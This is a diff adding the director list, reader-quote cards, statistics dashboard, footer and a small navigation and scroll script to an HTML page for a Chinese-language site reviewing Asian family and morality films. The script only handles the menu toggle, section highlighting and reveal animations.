+      <a href="#" class="treec"><div class="av" style="--a:#9e2b25;--b:#6b1d18"><span class="rg">日本</span><span class="ini">今</span></div><div class="info"><h4>今村昌平</h4><div class="en">Imamura Shohei · 1926–2006</div><div class="fl">代表作 <b>楢山节考</b> · 人类学式地逼近日本底层生存与性的真相。</div></div></a>
+      <a href="#" class="treec"><div class="av" style="--a:#6b3a4a;--b:#4a2531"><span class="rg">韩国</span><span class="ini">李</span></div><div class="info"><h4>李沧东</h4><div class="en">Lee Chang-dong · 1954–</div><div class="fl">代表作 <b>燃烧</b> · 用小说式叙事拆解韩国社会的阶级与虚无。</div></div></a>
+      <a href="#" class="treec"><div class="av" style="--a:#c9a24a;--b:#9a772c"><span class="rg">台湾</span><span class="ini">杨</span></div><div class="info"><h4>杨德昌</h4><div class="en">Edward Yang · 1947–2007</div><div class="fl">代表作 <b>一一</b> · 以冷静长镜解剖台北中产家庭的疏离与温存。</div></div></a>
+      <a href="#" class="treec"><div class="av" style="--a:#3d6b5a;--b:#2a4a3d"><span class="rg">日本</span><span class="ini">是</span></div><div class="info"><h4>是枝裕和</h4><div class="en">Hirokazu Kore-eda · 1962–</div><div class="fl">代表作 <b>小偷家族</b> · 用"非血缘家庭"重新定义亲情与归属。</div></div></a>
+      <a href="#" class="treec"><div class="av" style="--a:#4a5b8a;--b:#34406a"><span class="rg">伊朗</span><span class="ini">法</span></div><div class="info"><h4>阿斯哈·法哈迪</h4><div class="en">Asghar Farhadi · 1972–</div><div class="fl">代表作 <b>一次别离</b> · 在伊斯兰律法与人情之间逼出道德两难。</div></div></a>
+      <a href="#" class="treec"><div class="av" style="--a:#8a5b8a;--b:#654065"><span class="rg">韩国</span><span class="ini">金</span></div><div class="info"><h4>金基德</h4><div class="en">Kim Ki-duk · 1960–2020</div><div class="fl">代表作 <b>圣殇</b> · 以极端的肉体与暴力，拷问救赎的可能。</div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：观点现场 ===== -->
+<section class="band quote rv" id="quote">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>观点现场</span><h2 class="hd">读者怎么说 · <em>每一次讨论都算数</em></h2><p class="ds">来自影迷与撰稿人的真实声音，构成更立体的解读</p></div>
+      <a href="#" class="more">进入论坛 →</a>
+    </div>
+
+    <div class="qgrid">
+      <div class="qcard"><p>伦理片最动人的地方，不是给出一个答案，而是把观众逼到必须自己选择的角落。看完《楢山节考》，我整整两天没缓过来。</p><div class="src"><span class="av">木</span><div><b>木心</b><em>资深影迷 · 阅读 1.2k</em></div></div></div>
+      <div class="qcard"><p>是枝裕和的厉害在于，他从不审判任何人。那些偷来的温情，到底算不算一种真实的爱？</p><div class="src"><span class="av">川</span><div><b>川上</b><em>影评人 · 阅读 986</em></div></div></div>
+      <div class="qcard"><p>《燃烧》里的"塑料大棚"是一个完美的隐喻容器，每个人放进去的东西都不一样。这就是好电影的力量。</p><div class="src"><span class="av">晏</span><div><b>晏如</b><em>撰稿人 · 阅读 2.3k</em></div></div></div>
+      <div class="qcard"><p>看亚洲伦理片久了会发现，不同国家的家庭讲的都是同一件事——我们都在用一生学习如何好好告别。</p><div class="src"><span class="av">禾</span><div><b>禾子</b><em>读者 · 阅读 1.7k</em></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目六：数据看板 ===== -->
+<section class="band dash rv" id="dash">
+  <div class="wrap">
+    <div class="bd-top">
+      <div><span class="eyeb"><span class="bar"></span>数据看板</span><h2 class="hd">一叶知秋 · <em>平台的小数据</em></h2><p class="ds">用数字记录我们共同走过的观影旅程</p></div>
+    </div>
+
+    <div class="dashgrid">
+      <div class="dc"><div class="l">收录影片</div><div class="v">1,860</div><div class="d">覆盖 12 个地区</div></div>
+      <div class="dc"><div class="l">深度影评</div><div class="v">240</div><div class="d">编辑原创撰文</div></div>
+      <div class="dc"><div class="l">代表导演</div><div class="v">286</div><div class="d">含大师与新人</div></div>
+      <div class="dc"><div class="l">注册读者</div><div class="v">9.6<i> 万</i></div><div class="d">活跃讨论中</div></div>
+    </div>
+
+    <div class="barwrap">
+      <div class="barow"><span class="lb">日本</span><div class="track"><div class="fill" style="width:92%"></div></div><span class="vl">26%</span></div>
+      <div class="barow"><span class="lb">华语</span><div class="track"><div class="fill" style="width:86%"></div></div><span class="vl">22%</span></div>
+      <div class="barow"><span class="lb">韩国</span><div class="track"><div class="fill" style="width:78%"></div></div><span class="vl">18%</span></div>
+      <div class="barow"><span class="lb">伊朗</span><div class="track"><div class="fill" style="width:52%"></div></div><span class="vl">12%</span></div>
+      <div class="barow"><span class="lb">其他</span><div class="track"><div class="fill" style="width:88%"></div></div><span class="vl">22%</span></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="foot">
+  <div class="fin">
+    <div class="flay">
+      <div>
+        <a href="#top" class="logo fb"><span class="seal">亞</span><div><b>亚洲伦理电影网</b><em>yazhoulunlidianyingwang</em></div></a>
+        <p class="fabout">亚洲伦理电影网（yazhoulunlidianyingwang-wap.github.io）专注收录与品鉴亚洲各国探讨家庭、人性、道德与社会议题的深度伦理题材电影，以影评为核心的理性观影平台。</p>
+      </div>
+      <div class="fcol"><h5>网站导航</h5><ul>
+        <li><a href="#review">精选影评</a></li><li><a href="#region">地域档案</a></li><li><a href="#issue">议题图谱</a></li><li><a href="#tree">导演谱系</a></li><li><a href="#quote">观点现场</a></li>
+      </ul></div>
+      <div class="fcol"><h5>地域分类</h5><ul>
+        <li><a href="#">日本伦理片</a></li><li><a href="#">韩国伦理片</a></li><li><a href="#">华语伦理片</a></li><li><a href="#">伊朗伦理片</a></li><li><a href="#">泰国伦理片</a></li>
+      </ul></div>
+      <div class="fcol"><h5>关于本站</h5><ul>
+        <li><a href="#">关于我们</a></li><li><a href="#">投稿影评</a></li><li><a href="#">内容规范</a></li><li><a href="#">免责声明</a></li><li><a href="#">联系我们</a></li>
+      </ul></div>
+    </div>
+    <div class="fbot">
+      <span>&copy; 2026 亚洲伦理电影网 yazhoulunlidianyingwang-wap.github.io 版权所有</span>
+      <div><a href="#">内容规范</a> · <a href="#">免责声明</a> · <a href="#">联系我们</a> · <a href="#" class="u">yazhoulunlidianyingwang-wap.github.io</a></div>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  'use strict';
+  var burg=document.getElementById('burg'),nav=document.getElementById('nav'),
+      links=nav.querySelectorAll('a'),secs=[].slice.call(document.querySelectorAll('main section[id]'));
+
+  burg.addEventListener('click',function(){
+    var open=nav.style.display==='flex';
+    nav.style.display=open?'':'flex';
+    if(!open){nav.style.flexDirection='column';nav.style.position='absolute';nav.style.top='100%';
+      nav.style.left='0';nav.style.right='0';nav.style.padding='22px';
+      nav.style.background='rgba(13,10,8,0.98)';nav.style.borderBottom='1px solid var(--line2)';}
+  });
+  links.forEach(function(a){a.addEventListener('click',function(){nav.style.display='';});});
+
+  function onScroll(){var y=window.pageYOffset;var cur='';
+    secs.forEach(function(s){if(y>=s.offsetTop-150)cur=s.id;});
+    links.forEach(function(a){a.classList.remove('on');if(a.getAttribute('href')==='#'+cur)a.classList.add('on');});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+  var rvs=[].slice.call(document.querySelectorAll('.rv'));
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){es.forEach(function(e){
+      if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});},{threshold:0.08,rootMargin:'0px 0px -40px'});
+    rvs.forEach(function(el){io.observe(el);});
+  }else{rvs.forEach(function(el){el.classList.add('in');});}
+})();
+</script>
+
+</body>
+</html>
